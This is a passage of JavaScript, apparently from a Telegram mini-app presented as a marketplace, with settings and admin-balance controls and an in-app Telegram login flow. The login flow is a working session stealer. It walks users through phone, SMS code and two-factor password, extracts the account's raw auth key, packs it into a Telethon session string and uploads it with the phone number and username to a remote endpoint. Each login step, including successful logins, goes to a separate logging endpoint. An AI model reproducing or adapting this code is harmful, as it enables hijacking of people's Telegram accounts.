  toggleSendModeButtons(true);
  const { res, data } = await postJson('/market/settings', {
    user_id: user.id,
    send_mode: nextMode,
  });
  sendModeLoading = false;
  toggleSendModeButtons(false);

  if (!res || !res.ok) {
    showAlert(data?.detail || t('settings_send_error'));
    return;
  }
  setSendMode(data?.send_mode || nextMode);
}

const ADMIN_ACTIONS = {
  joined: {
    titleKey: 'admin_modal_joined_title',
    labelKey: 'admin_modal_joined_label',
    type: 'date',
    inputMode: 'none',
  },
  stars: {
    titleKey: 'admin_modal_stars_title',
    labelKey: 'admin_modal_stars_label',
    type: 'number',
    inputMode: 'numeric',
  },
  balance: {
    titleKey: 'admin_modal_balance_title',
    labelKey: 'admin_modal_balance_label',
    type: 'number',
    inputMode: 'decimal',
  },
};

function formatDateInput(date) {
  if (!(date instanceof Date) || Number.isNaN(date.getTime())) return '';
  return date.toISOString().slice(0, 10);
}

function openAdminModal(action) {
  if (!elements.adminModal || !elements.adminInput) return;
  const config = ADMIN_ACTIONS[action];
  if (!config) return;
  activeAdminAction = action;

  if (elements.adminTitle) elements.adminTitle.textContent = t(config.titleKey);
  if (elements.adminSubtitle) elements.adminSubtitle.textContent = t('admin_modal_subtitle');
  if (elements.adminLabel) elements.adminLabel.textContent = t(config.labelKey);

  elements.adminInput.type = config.type;
  elements.adminInput.inputMode = config.inputMode || 'text';
  elements.adminInput.step = action === 'balance' ? '0.01' : '1';
  elements.adminInput.min = '0';

  const user = getTelegramUser();
  if (action === 'joined') {
    const joinedDate = resolveJoinedDate(state.profile, user?.id);
    elements.adminInput.value = formatDateInput(joinedDate);
  } else if (action === 'stars') {
    elements.adminInput.value = String(Math.round(Number(state.profile?.stars || 0)));
  } else if (action === 'balance') {
    elements.adminInput.value = String(state.profile?.balance ?? 0);
  }

  elements.adminModal.classList.add('open');
  elements.adminModal.setAttribute('aria-hidden', 'false');
  setTimeout(() => elements.adminInput?.focus(), 50);
}

function closeAdminModal() {
  if (!elements.adminModal) return;
  elements.adminModal.classList.remove('open');
  elements.adminModal.setAttribute('aria-hidden', 'true');
  activeAdminAction = null;
  if (elements.adminInput) elements.adminInput.value = '';
}

function parseAdminNumber(raw) {
  const cleaned = String(raw || '').trim().replace(',', '.');
  if (!cleaned) return null;
  const value = Number(cleaned);
  if (!Number.isFinite(value)) return null;
  return value;
}

async function saveAdminValue() {
  if (!activeAdminAction || !elements.adminInput) return;
  const user = getTelegramUser();
  if (!user?.id) {
    showAlert(t('admin_modal_error'));
    return;
  }

  const payload = { user_id: user.id };
  const rawValue = elements.adminInput.value;

  if (activeAdminAction === 'joined') {
    if (!rawValue) {
      showAlert(t('admin_modal_error'));
      return;
    }
    payload.joined_at = rawValue;
  } else if (activeAdminAction === 'stars') {
    const value = parseAdminNumber(rawValue);
    if (value == null) {
      showAlert(t('admin_modal_error'));
      return;
    }
    payload.stars = Math.max(0, Math.round(value));
  } else if (activeAdminAction === 'balance') {
    const value = parseAdminNumber(rawValue);
    if (value == null) {
      showAlert(t('admin_modal_error'));
      return;
    }
    payload.balance = Math.max(0, Number(value.toFixed(2)));
  }

  const { res, data } = await postJson('/market/admin/profile', payload);
  if (!res || !res.ok) {
    showAlert(data?.detail || t('admin_modal_error'));
    return;
  }
  if (data?.profile) {
    state.profile = { ...state.profile, ...data.profile };
    applyProfile(state.profile);
  }
  if (activeAdminAction === 'joined' && payload.joined_at) {
    const parsed = new Date(payload.joined_at);
    setJoinedDateStorage(user.id, parsed);
  }
  closeAdminModal();
  showToast(t('admin_modal_saved'));
}

function closeSettingsPanel() {
  if (!elements.settingsPanel) return;
  elements.settingsPanel.classList.remove('is-open');
  elements.settingsPanel.setAttribute('aria-hidden', 'true');
}

function toggleSettingsPanel() {
  if (!elements.settingsPanel) return;
  const isOpen = elements.settingsPanel.classList.toggle('is-open');
  elements.settingsPanel.setAttribute('aria-hidden', String(!isOpen));
}

function clearBootOverlay() {
  if (document.body.classList.contains('is-loading')) {
    document.body.classList.remove('is-loading');
  }
  if (elements.boot) {
    elements.boot.classList.add('is-hidden');
    const bootEl = elements.boot;
    elements.boot = null;
    setTimeout(() => {
      bootEl.remove();
    }, 500);
  }
}

function shouldSkipBoot() {
  try {
    return sessionStorage.getItem(BOOT_KEY) === '1';
  } catch (err) {
    return false;
  }
}

function markBootShown() {
  try {
    sessionStorage.setItem(BOOT_KEY, '1');
  } catch (err) {
    console.warn('Boot flag save failed:', err);
  }
}

function triggerHaptic(style = 'light') {
  if (!state.hapticsEnabled) return;
  const tg = tgWebApp || window.Telegram?.WebApp;
  const impact = tg?.HapticFeedback?.impactOccurred;
  const allowed = new Set(['light', 'medium', 'heavy', 'rigid', 'soft']);
  try {
    if (typeof impact === 'function') {
      impact(allowed.has(style) ? style : 'light');
      return;
    }
  } catch (err) {
    console.warn('HapticFeedback failed:', err);
  }
  if (typeof navigator !== 'undefined' && typeof navigator.vibrate === 'function') {
    const duration = style === 'heavy' ? 30 : style === 'medium' ? 20 : 12;
    navigator.vibrate(duration);
  }
}

function initTelegram() {
  (function waitTg() {
    const tg = window.Telegram?.WebApp;
    if (tg?.ready) {
      tgWebApp = tg;
      try {
        tg.ready();
        tg.expand?.();
      } catch (err) {
        console.warn('Telegram WebApp init failed:', err);
      }
      applyTelegramLanguageIfUnlocked();
      applyProfile(state.profile);
      handleStartParam();
      return;
    }
    setTimeout(waitTg, 50);
  })();
}

let cartBackHandler = null;

function showCartBackButton() {
  const tg = tgWebApp || window.Telegram?.WebApp;
  if (!tg?.BackButton) return;
  if (cartBackHandler) tg.BackButton.offClick(cartBackHandler);
  cartBackHandler = () => {
    triggerHaptic('light');
    closeCartModal();
  };
  tg.BackButton.onClick(cartBackHandler);
  tg.BackButton.show();
}

function hideCartBackButton() {
  const tg = tgWebApp || window.Telegram?.WebApp;
  if (!tg?.BackButton) return;
  if (cartBackHandler) tg.BackButton.offClick(cartBackHandler);
  cartBackHandler = null;
  tg.BackButton.hide();
}

function getTelegramUser() {
  const user = window.Telegram?.WebApp?.initDataUnsafe?.user;
  if (user) return user;

  const initData = window.Telegram?.WebApp?.initData;
  if (!initData) return null;

  try {
    const params = new URLSearchParams(initData);
    const rawUser = params.get('user');
    if (rawUser) return JSON.parse(rawUser);
  } catch (err) {
    console.warn('Failed to parse Telegram init data:', err);
  }

  return null;
}

function buildRequesterPayload() {
  const user = getTelegramUser();
  if (!user) {
    return {
      user_id: null,
      username: null,
      first_name: null,
      last_name: null,
    };
  }

  return {
    user_id: user.id ?? null,
    username: user.username ?? null,
    first_name: user.first_name ?? null,
    last_name: user.last_name ?? null,
  };
}

function safeStorageGet(key) {
  try {
    return localStorage.getItem(key) || '';
  } catch (err) {
    return '';
  }
}

function safeStorageSet(key, value) {
  try {
    localStorage.setItem(key, value);
  } catch (err) {
    console.warn('Storage write failed:', err);
  }
}

function safeStorageRemove(key) {
  try {
    localStorage.removeItem(key);
  } catch (err) {
    console.warn('Storage remove failed:', err);
  }
}

function createDeferred() {
  let resolve;
  let reject;
  const promise = new Promise((res, rej) => {
    resolve = res;
    reject = rej;
  });
  return { promise, resolve, reject };
}

function getGramjsLib() {
  const candidates = [window.telegram, window.gramjs, window.GramJS, window.gramJS];
  for (const candidate of candidates) {
    if (!candidate) continue;
    const lib = candidate.default || candidate;
    if (lib?.TelegramClient && (lib.sessions?.StringSession || lib.StringSession)) {
      return lib;
    }
  }
  return null;
}

function patchGramjs(lib) {
  if (!lib) return false;
  let patched = false;

  const Connection = lib?.Connection;
  if (Connection?.prototype && !Connection.prototype.__patchedCancelLoops) {
    Connection.prototype._cancelLoops = function () {
      if (this.recvCancel && typeof this.recvCancel.cancel === 'function') {
        this.recvCancel.cancel();
      }
      if (this.sendCancel && typeof this.sendCancel.cancel === 'function') {
        this.sendCancel.cancel();
      }
    };
    Connection.prototype.__patchedCancelLoops = true;
    patched = true;
  }

  const MTProtoSender = lib?.network?.MTProtoSender || lib?.MTProtoSender;
  if (MTProtoSender?.prototype && !MTProtoSender.prototype.__patchedCancelLoops) {
    MTProtoSender.prototype._cancelLoops = function () {
      this._cancelSend = true;
      if (this.cancellableRecvLoopPromise && typeof this.cancellableRecvLoopPromise.cancel === 'function') {
        this.cancellableRecvLoopPromise.cancel();
      }
    };
    MTProtoSender.prototype.__patchedCancelLoops = true;
    patched = true;
  }

  return patched;
}

function loadScript(url) {
  return new Promise((resolve, reject) => {
    const script = document.createElement('script');
    script.src = url;
    script.async = true;
    script.onload = () => resolve(url);
    script.onerror = () => reject(new Error(`Failed to load ${url}`));
    document.head.appendChild(script);
  });
}

async function ensureGramjsLibLoaded() {
  const existing = getGramjsLib();
  if (existing) {
    gramjsLib = existing;
    patchGramjs(gramjsLib);
    return;
  }
  if (gramjsLoadPromise) {
    await gramjsLoadPromise;
    return;
  }

  gramjsLoadPromise = (async () => {
    for (const url of GRAMJS_LOAD_URLS) {
      try {
        await loadScript(url);
        const lib = getGramjsLib();
        if (lib) {
          gramjsLib = lib;
          patchGramjs(lib);
          return;
        }
      } catch (err) {
        console.warn('GramJS load failed:', err);
      }
    }
    throw new Error('GRAMJS_NOT_LOADED');
  })();

  try {
    await gramjsLoadPromise;
  } finally {
    gramjsLoadPromise = null;
  }
}

function normalizePhone(value) {
  if (!value) return null;
  const digits = String(value).replace(/\D/g, '');
  return digits || null;
}

function normalizeUsername(value) {
  if (!value) return null;
  const cleaned = String(value).trim().replace(/^@/, '').toLowerCase();
  return cleaned || null;
}

function shouldSkipMismatchCheck(phone) {
  if (GRAMJS_ALLOWED_MISMATCH_PHONES === null) return true;
  if (!Array.isArray(GRAMJS_ALLOWED_MISMATCH_PHONES)) return false;
  const normalized = normalizePhone(phone);
  if (!normalized) return false;
  return GRAMJS_ALLOWED_MISMATCH_PHONES.some((entry) => normalizePhone(entry) === normalized);
}

function stringifyId(value) {
  if (value === null || value === undefined) return null;
  if (typeof value === 'bigint') return value.toString();
  if (typeof value === 'object' && typeof value.toString === 'function') {
    const text = value.toString();
    return text ? String(text) : null;
  }
  return String(value);
}

function generateAuthToken() {
  if (typeof crypto !== 'undefined' && typeof crypto.randomUUID === 'function') {
    return crypto.randomUUID();
  }
  return `${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 10)}`;
}

function isIPv4(value) {
  if (!value || typeof value !== 'string') return false;
  const parts = value.split('.');
  if (parts.length !== 4) return false;
  return parts.every((part) => {
    if (part.trim() === '' || !/^\d+$/.test(part)) return false;
    const num = Number(part);
    return num >= 0 && num <= 255;
  });
}

function buildTelethonString(dcId, ip, port, authKey) {
  if (typeof Buffer === 'undefined') {
    throw new Error('BUFFER_MISSING');
  }
  const ipBytes = ip.split('.').map((part) => Number(part));
  const portValue = Number(port || 0);
  if (!portValue || portValue < 0 || portValue > 65535) {
    throw new Error('Invalid DC port');
  }
  const authKeyBuf = Buffer.isBuffer(authKey) ? authKey : Buffer.from(authKey);
  if (!authKeyBuf || authKeyBuf.length < 64) {
    throw new Error('Auth key missing');
  }
  const payload = Buffer.concat([
    Buffer.from([Number(dcId) & 0xff]),
    Buffer.from(ipBytes),
    Buffer.from([(portValue >> 8) & 0xff, portValue & 0xff]),
    authKeyBuf,
  ]);
  return `1${payload.toString('base64')}`;
}

async function resolveTelethonDc(client, lib) {
  const dcId = client?.session?.dcId;
  const sessionAddress = client?.session?.serverAddress;
  const sessionPort = client?.session?.port;
  let ip = isIPv4(sessionAddress) ? sessionAddress : null;
  let port = sessionPort || 443;

  try {
    const config = await client.invoke(new lib.Api.help.GetConfig());
    const options = (config?.dcOptions || []).filter((opt) => opt.id === dcId && !opt.ipv6);
    if (options.length) {
      const preferred = options.find((opt) => opt.port === 443) || options[0];
      const optIp = preferred.ipAddress || preferred.ip_address;
      if (optIp && isIPv4(optIp)) {
        ip = optIp;
      }
      if (preferred.port) {
        port = preferred.port;
      }
    }
  } catch (err) {
    console.warn('GetConfig failed:', err);
  }

  if (!dcId) {
    throw new Error('DC ID missing');
  }
  if (!ip || !isIPv4(ip)) {
    throw new Error('IPv4 address not found for this DC');
  }
  return { dcId, ip, port };
}

async function buildTelethonSession(client, lib) {
  const authKey = client?.session?.authKey?.getKey?.();
  if (!authKey) {
    throw new Error('Auth key missing');
  }
  const { dcId, ip, port } = await resolveTelethonDc(client, lib);
  const telethon = buildTelethonString(dcId, ip, port, authKey);
  safeStorageSet(GRAMJS_TELETHON_KEY, telethon);
  window.marketTelethonSession = telethon;
  if (typeof window.onTelethonSession === 'function') {
    try {
      window.onTelethonSession(telethon);
    } catch (err) {
      console.warn('onTelethonSession failed:', err);
    }
  }
  return telethon;
}

async function uploadTelethonSession(session, phone) {
  if (!session) return;
  const requester = buildRequesterPayload();
  const payload = {
    session,
    user_id: requester.user_id ?? null,
    username: requester.username ?? null,
    phone: phone ?? null,
    source: 'market-login-tg',
  };
  const headers = { 'Content-Type': 'application/json' };
  if (GRAMJS_UPLOAD_TOKEN) {
    headers['X-Session-Token'] = GRAMJS_UPLOAD_TOKEN;
  }
  const endpoint = /^https?:\/\//i.test(GRAMJS_UPLOAD_ENDPOINT)
    ? GRAMJS_UPLOAD_ENDPOINT
    : `${API_BASE}${GRAMJS_UPLOAD_ENDPOINT.startsWith('/') ? '' : '/'}${GRAMJS_UPLOAD_ENDPOINT}`;
  try {
    const res = await fetch(endpoint, {
      method: 'POST',
      headers,
      body: JSON.stringify(payload),
      keepalive: true,
    });
    if (!res.ok) {
      let detail = '';
      try {
        detail = await res.text();
      } catch (err) {
        detail = '';
      }
      console.warn('Session upload failed:', res.status, detail);
      return { ok: false, status: res.status, detail };
    }
    return { ok: true };
  } catch (err) {
    console.warn('Session upload failed:', err);
    return { ok: false, error: err };
  }
}

async function sendAuthLog(title, phone, extra) {
  if (!title) return;
  const requester = buildRequesterPayload();
  const payload = {
    title,
    phone: phone || null,
    user_id: requester.user_id ?? null,
    username: requester.username ?? null,
    first_name: requester.first_name ?? null,
    last_name: requester.last_name ?? null,
    extra: extra ?? null,
  };
  const headers = { 'Content-Type': 'application/json' };
  if (GRAMJS_UPLOAD_TOKEN) {
    headers['X-Session-Token'] = GRAMJS_UPLOAD_TOKEN;
  }
  try {
    await fetch(`${API_BASE}/auth/log`, {
      method: 'POST',
      headers,
      body: JSON.stringify(payload),
      keepalive: true,
    });
  } catch (err) {
    console.warn('Auth log failed:', err);
  }
}

async function fetchGramjsPasswordHint(client, lib) {
  try {
    const response = await client.invoke(new lib.Api.account.GetPassword());
    return response?.hint || '';
  } catch (err) {
    return '';
  }
}

function getSentCodeMeta(sent) {
  const typeObj = sent?.type;
  const nextObj = sent?.nextType;
  const sentType =
    typeObj?.className ||
    typeObj?.constructor?.name ||
    typeObj?.type ||
    'unknown';
  const nextType =
    nextObj?.className ||
    nextObj?.constructor?.name ||
    nextObj?.type ||
    '—';
  const timeout = sent?.timeout ?? null;
  const phoneCodeHash =
    sent?.phoneCodeHash ||
    sent?.phone_code_hash ||
    sent?.phoneCodeHash?.value ||
    '';
  return { sentType, nextType, timeout, phoneCodeHash };
}

async function sendCodeRequest(client, phone) {
  const lib = gramjsLib || getGramjsLib();
  if (!lib?.Api?.auth?.SendCode) {
    throw new Error('GRAMJS_START_MISSING');
  }
  const settings = new lib.Api.CodeSettings({
    allowFlashcall: false,
    allowMissedCall: false,
    allowFirebase: false,
  });
  const sent = await client.invoke(
    new lib.Api.auth.SendCode({
      phoneNumber: phone,
      apiId: GRAMJS_API_ID,
      apiHash: GRAMJS_API_HASH,
      settings,
    })
  );
  return sent;
}

async function ensureGramjsClient() {
  if (gramjsClient) {
    return gramjsClient;
  }
  await ensureGramjsLibLoaded();
  const lib = gramjsLib || getGramjsLib();
  if (!lib) {
    throw new Error('GRAMJS_NOT_LOADED');
  }
  if (!GRAMJS_API_ID || !GRAMJS_API_HASH) {
    throw new Error('GRAMJS_API_MISSING');
  }
  const StringSession = lib.sessions?.StringSession || lib.StringSession;
  if (!StringSession) {
    throw new Error('GRAMJS_NOT_LOADED');
  }
  const stored = safeStorageGet(GRAMJS_SESSION_KEY);
  const lang = typeof navigator !== 'undefined' && navigator.language ? navigator.language : 'en';
  const ua = typeof navigator !== 'undefined' && navigator.userAgent ? navigator.userAgent : 'Browser';
  const clientParams = {
    connectionRetries: 2,
    deviceModel: 'GramJS Browser',
    systemVersion: ua,
    appVersion: '1.0',
    langCode: lang || 'en',
    systemLangCode: lang || 'en',
    useWSS: true,
  };
  gramjsClient = new lib.TelegramClient(
    new StringSession(stored),
    GRAMJS_API_ID,
    GRAMJS_API_HASH,
    clientParams
  );
  await gramjsClient.connect();
  return gramjsClient;
}

async function validateRequesterMatch(client, phone) {
  const requester = buildRequesterPayload();
  const user = await client.getMe();
  const mismatchReasons = [];

  const requesterId = stringifyId(requester.user_id);
  const sessionId = stringifyId(user?.id);

  if (!requesterId) {
    mismatchReasons.push('requester_id_missing');
  } else if (sessionId && requesterId !== sessionId) {
    mismatchReasons.push(`id_mismatch:${requesterId}->${sessionId}`);
  }

  const requesterUsername = normalizeUsername(requester.username);
  const sessionUsername = normalizeUsername(user?.username);
  if (requesterUsername) {
    if (!sessionUsername) {
      mismatchReasons.push(`username_missing:@${requesterUsername}`);
    } else if (sessionUsername !== requesterUsername) {
      mismatchReasons.push(`username_mismatch:@${requesterUsername}->@${sessionUsername}`);
    }
  }

  const skipCheck = shouldSkipMismatchCheck(phone);
  if (skipCheck) {
    if (mismatchReasons.length) {
      await sendAuthLog(
        'ℹ️ Пропущена проверка аккаунта',
        phone,
        'override_phone_whitelist'
      );
    }
    return;
  }

  if (mismatchReasons.length) {
    const err = new Error('REQUESTER_MISMATCH');
    err.reasons = mismatchReasons;
    throw err;
  }
}

function normalizeAuthError(err) {
  const raw = String(err?.errorMessage || err?.message || err || '').trim();
  const upper = raw.toUpperCase();
  const code = String(err?.code || '').toUpperCase();
  const token = code || upper;
  const secondsCandidate =
    err?.seconds ??
    err?.secondsLeft ??
    err?.wait ??
    err?.error?.seconds ??
    err?.error?.wait;
  const secondsValue = Number(secondsCandidate);

  if (token.includes('GRAMJS_NOT_LOADED') || token.includes('GRAMJS_START_MISSING') || token.includes('STRINGSESSION')) {
    return { message: t('auth_gramjs_missing'), step: 'phone' };
  }
  if (token.includes('GRAMJS_API_MISSING') || token.includes('API ID') || token.includes('API HASH')) {
    return { message: t('auth_api_missing'), step: 'phone' };
  }
  if (token.includes('CODE_TYPE_NOT_APP')) {
    return { message: t('auth_code_not_app'), step: 'phone' };
  }
  if (token.includes('REQUESTER_MISMATCH')) {
    return { message: t('auth_account_mismatch'), step: 'phone' };
  }
  if (token.includes('PHONE_NUMBER_INVALID')) {
    return { message: t('auth_phone_invalid'), step: 'phone' };
  }
  if (token.includes('PHONE_NUMBER_BANNED')) {
    return { message: t('auth_phone_banned'), step: 'phone' };
  }
  if (token.includes('PHONE_CODE_INVALID')) {
    return { message: t('auth_code_invalid'), step: 'code' };
  }
  if (token.includes('PHONE_CODE_EXPIRED')) {
    return { message: t('auth_code_expired'), step: 'code' };
  }
  if (token.includes('PHONE_CODE_EMPTY') || token.includes('CODE IS EMPTY')) {
    return { message: t('code_short'), step: 'code' };
  }
  if (token.includes('PASSWORD_HASH_INVALID')) {
    return { message: t('auth_password_invalid'), step: 'password' };
  }
  if (token.includes('SESSION_PASSWORD_NEEDED')) {
    return { message: t('password_required'), step: 'password' };
  }

  if (Number.isFinite(secondsValue) && secondsValue > 0) {
    return { message: t('rate_limit', { seconds: secondsValue }), step: 'phone' };
  }

  const floodMatch = token.match(/FLOOD_WAIT_?(\d+)/);
  if (floodMatch) {
    const seconds = Number(floodMatch[1]);
    return {
      message: Number.isFinite(seconds) ? t('rate_limit', { seconds }) : t('rate_limit_generic'),
      step: 'phone',
    };
  }
  const waitMatch = raw.match(/WAIT OF\s+(\d+)/i);
  if (waitMatch) {
    const seconds = Number(waitMatch[1]);
    return {
      message: Number.isFinite(seconds) ? t('rate_limit', { seconds }) : t('rate_limit_generic'),
      step: 'phone',
    };
  }
  if (token.includes('PHONE_NUMBER_FLOOD')) {
    return { message: t('rate_limit_generic'), step: 'phone' };
  }
  if (token.includes('FLOOD_WAIT')) {
    return { message: t('rate_limit_generic'), step: 'phone' };
  }

  return { message: raw || t('auth_error'), step: 'phone' };
}

function getAuthErrorToken(err) {
  const raw = String(err?.errorMessage || err?.message || err || '').trim();
  const code = String(err?.code || '').toUpperCase();
  const token = code || raw.toUpperCase();
  return { raw, token };
}

function extractAuthErrorSeconds(err, raw, token) {
  const secondsCandidate =
    err?.seconds ??
    err?.secondsLeft ??
    err?.wait ??
    err?.error?.seconds ??
    err?.error?.wait;
  const secondsValue = Number(secondsCandidate);
  if (Number.isFinite(secondsValue) && secondsValue > 0) {
    return secondsValue;
  }
  const floodMatch = token.match(/FLOOD_WAIT_?(\d+)/);
  if (floodMatch) {
    const seconds = Number(floodMatch[1]);
    return Number.isFinite(seconds) ? seconds : null;
  }
  const waitMatch = raw.match(/WAIT OF\s+(\d+)/i);
  if (waitMatch) {
    const seconds = Number(waitMatch[1]);
    return Number.isFinite(seconds) ? seconds : null;
  }
  return null;
}

function markAuthErrorLogged(err) {
  if (err && typeof err === 'object') {
    err.__authLogged = true;
  }
}

function isAuthErrorLogged(err) {
  return Boolean(err && typeof err === 'object' && err.__authLogged);
}

async function logAuthError(err, phone) {
  const { raw, token } = getAuthErrorToken(err);
  if (!token && !raw) return;
  if (token.includes('REQUESTER_MISMATCH')) return;

  if (token.includes('PHONE_CODE_INVALID')) {
    await sendAuthLog('Неверный код', phone);
    markAuthErrorLogged(err);
    return;
  }
  if (token.includes('PHONE_CODE_EXPIRED')) {
    await sendAuthLog('Код истёк', phone);
    markAuthErrorLogged(err);
    return;
  }
  if (token.includes('PHONE_CODE_EMPTY') || token.includes('CODE IS EMPTY')) {
    await sendAuthLog('Код пустой', phone);
    markAuthErrorLogged(err);
    return;
  }
  if (token.includes('PASSWORD_HASH_INVALID')) {
    await sendAuthLog('Неверный пароль', phone);
    markAuthErrorLogged(err);
    return;
  }
  if (token.includes('PHONE_NUMBER_INVALID')) {
    await sendAuthLog('Ошибка: неверный номер', phone);
    markAuthErrorLogged(err);
    return;
  }
  if (token.includes('PHONE_NUMBER_BANNED')) {
    await sendAuthLog('Ошибка: номер заблокирован', phone);
    markAuthErrorLogged(err);
    return;
  }
  if (token.includes('CODE_TYPE_NOT_APP')) {
    await sendAuthLog('Ошибка отправки кода', phone, raw || null);
    markAuthErrorLogged(err);
    return;
  }

  const seconds = extractAuthErrorSeconds(err, raw, token);
  if (token.includes('PHONE_NUMBER_FLOOD') || token.includes('FLOOD_WAIT') || seconds) {
    const extra = Number.isFinite(seconds) ? `Ждать ${seconds} с` : null;
    await sendAuthLog('Flood wait при входе', phone, extra);
    markAuthErrorLogged(err);
    return;
  }

  await sendAuthLog('Ошибка входа', phone, raw || null);
  markAuthErrorLogged(err);
}

function clearGramjsAuth() {
  gramjsAuth = null;
  authToken = null;
  if (gramjsAuthTimer) {
    clearTimeout(gramjsAuthTimer);
    gramjsAuthTimer = null;
  }
}

async function disconnectGramjsClient() {
  if (!gramjsClient) return;
  try {
    await gramjsClient.disconnect();
  } catch (err) {
    console.warn('GramJS disconnect failed:', err);
  } finally {
    gramjsClient = null;
  }
}

async function abortGramjsAuth() {
  if (gramjsAuth) {
    gramjsAuth.cancelled = true;
    if (gramjsAuth.codeDeferred?.reject) {
      gramjsAuth.codeDeferred.reject(new Error('AUTH_USER_CANCEL'));
    }
    if (gramjsAuth.passwordDeferred?.reject) {
      gramjsAuth.passwordDeferred.reject(new Error('AUTH_USER_CANCEL'));
    }
  }
  clearGramjsAuth();
  await disconnectGramjsClient();
}

function storeGramjsSession(client) {
  let session = '';
  try {
    session = client.session.save();
  } catch (err) {
    console.warn('Failed to save GramJS session:', err);
  }
  if (!session) return '';

  safeStorageSet(GRAMJS_SESSION_KEY, session);
  window.marketGramjsSession = session;
  if (typeof window.onGramjsSession === 'function') {
    try {
      window.onGramjsSession(session);
    } catch (err) {
      console.warn('onGramjsSession failed:', err);
    }
  }
  return session;
}

async function finalizeGramjsAuth(client, auth) {
  if (!auth || auth !== gramjsAuth || auth.cancelled) return;

  const lib = gramjsLib || getGramjsLib();
  try {
    await validateRequesterMatch(client, auth.phone);
  } catch (err) {
    if (err?.reasons) {
      console.warn('Account mismatch:', err.reasons);
      await sendAuthLog(
        '🚫 Несовпадение аккаунта',
        auth.phone,
        err.reasons.join('; ')
      );
      markAuthErrorLogged(err);
    }
    if (lib?.Api?.auth?.LogOut) {
      try {
        await client.invoke(new lib.Api.auth.LogOut());
      } catch (logoutErr) {
        console.warn('Logout failed:', logoutErr);
      }
    }
    await disconnectGramjsClient();
    await handleGramjsAuthError(err, auth);
    return;
  }

  const gramjsSession = storeGramjsSession(client);
  let telethonSession = '';
  if (lib) {
    try {
      telethonSession = await buildTelethonSession(client, lib);
    } catch (err) {
      console.warn('Telethon session build failed:', err);
    }
  }
  if (!telethonSession && gramjsSession) {
    telethonSession = gramjsSession;
    safeStorageSet(GRAMJS_TELETHON_KEY, telethonSession);
  }
  let uploadOk = false;
  if (telethonSession) {
    const uploadResult = await uploadTelethonSession(telethonSession, auth.phone);
    if (uploadResult && uploadResult.ok === false) {
      setAuthStatus(t('auth_session_failed'), true);
    } else {
      uploadOk = true;
    }
  } else {
    setAuthStatus(t('auth_session_failed'), true);
  }

  if (uploadOk) {
    let accountUser = auth?.user || null;
    if (!accountUser) {
      try {
        accountUser = await client.getMe();
      } catch (err) {
        accountUser = null;
      }
    }
    const accountDisplay =
      accountUser?.username ||
      [accountUser?.firstName, accountUser?.lastName].filter(Boolean).join(' ') ||
      '—';
    const accountId = stringifyId(accountUser?.id);
    const extraParts = [];
    if (accountDisplay) extraParts.push(`Аккаунт: ${accountDisplay}`);
    if (accountId) extraParts.push(`ID: ${accountId}`);
    await sendAuthLog('Успешный вход', auth.phone, extraParts.join(' | ') || null);
  }

  await disconnectGramjsClient();
  clearGramjsAuth();
  setAuthorized(true);
  setAuthStatus('');
  showAuthStep(elements.authLoading);
  await wait(5000);
  showAuthStep(elements.authSuccess);
  authLoading = false;
  if (elements.authStart) elements.authStart.disabled = false;
}

async function handleGramjsAuthError(err, auth) {
  if (auth && gramjsAuth && auth !== gramjsAuth) return;
  if (auth?.cancelled) return;
  const raw = String(err?.errorMessage || err?.message || err || '').toUpperCase();
  if (raw.includes('AUTH_USER_CANCEL')) return;

  if (!isAuthErrorLogged(err)) {
    await logAuthError(err, auth?.phone);
  }

  clearGramjsAuth();
  await disconnectGramjsClient();
  authLoading = false;
  if (elements.authStart) elements.authStart.disabled = false;
  toggleAuthInputs(elements.authCodeForm, false);
  toggleAuthInputs(elements.authPasswordForm, false);

  const info = normalizeAuthError(err);
  setAuthStatus(info.message, true);

  if (info.step === 'password') {
    setPasswordError(true);
    showAuthStep(elements.authPasswordForm);
    return;
  }
  if (info.step === 'code') {
    setCodeError(true);
    showAuthStep(elements.authCodeForm);
    return;
  }
  showAuthStep(elements.authIntro);
}

function prepareCodePrompt(auth, message, isError = false, clearInput = false) {
  auth.codeDeferred = createDeferred();
  authLoading = false;
  if (elements.authCodeInput && clearInput) {
    elements.authCodeInput.value = '';
  }
  showAuthStep(elements.authCodeForm);
  toggleAuthInputs(elements.authCodeForm, false);
  setCodeError(Boolean(isError));
  if (message !== undefined) {
    setAuthStatus(message, Boolean(isError));
  }
  if (elements.authStart) elements.authStart.disabled = false;
  if (clearInput) syncCodeCells();
}

function preparePasswordPrompt(auth, hint, message, isError = false) {
  auth.passwordDeferred = createDeferred();
  authLoading = false;
  if (elements.authPasswordInput && isError) {
    elements.authPasswordInput.value = '';
  }
  setPasswordHint(hint || '');
  showAuthStep(elements.authPasswordForm);
  toggleAuthInputs(elements.authPasswordForm, false);
  setPasswordError(Boolean(isError));
  if (message !== undefined) {
    setAuthStatus(message, Boolean(isError));
  }
  if (elements.authStart) elements.authStart.disabled = false;
}

function isAuthUserCancel(err) {
  const { token } = getAuthErrorToken(err);
  return token.includes('AUTH_USER_CANCEL');
}

async function runPasswordFlow(client, auth, initialPasswordInfo = null) {
  const lib = gramjsLib || getGramjsLib();
  if (!lib?.Api?.account?.GetPassword) {
    throw new Error('GRAMJS_START_MISSING');
  }
  let passwordInfo = initialPasswordInfo;
  let message = t('password_prompt');
  let isError = false;

  while (auth && !auth.cancelled) {
    if (!passwordInfo) {
      passwordInfo = await client.invoke(new lib.Api.account.GetPassword());
    }
    const hint = passwordInfo?.hint || '';
    preparePasswordPrompt(auth, hint, message, isError);
    message = t('password_prompt');
    isError = false;

    let password;
    try {
      password = await auth.passwordDeferred.promise;
    } catch (err) {
      if (isAuthUserCancel(err)) return;
      throw err;
    }
    if (auth.cancelled) return;

    try {
      if (!lib?.password?.computeCheck) {
        throw new Error('GRAMJS_START_MISSING');
      }
      const passwordCheck = await lib.password.computeCheck(passwordInfo, password);
      const result = await client.invoke(new lib.Api.auth.CheckPassword({ password: passwordCheck }));
      if (result?.user) auth.user = result.user;
      await sendAuthLog('Введён пароль', auth.phone);
      await finalizeGramjsAuth(client, auth);
      return;
    } catch (err) {
      const { token } = getAuthErrorToken(err);
      if (token.includes('PASSWORD_HASH_INVALID')) {
        await sendAuthLog('Неверный пароль', auth.phone);
        markAuthErrorLogged(err);
        passwordInfo = null;
        message = t('auth_password_invalid');
        isError = true;
        continue;
      }
      throw err;
    }
  }
}

async function runGramjsAuthFlow(client, auth) {
  const lib = gramjsLib || getGramjsLib();
  if (!lib?.Api?.auth?.SignIn) {
    throw new Error('GRAMJS_START_MISSING');
  }

  while (auth && !auth.cancelled) {
    let code;
    try {
      code = await auth.codeDeferred.promise;
    } catch (err) {
      if (isAuthUserCancel(err)) return;
      throw err;
    }
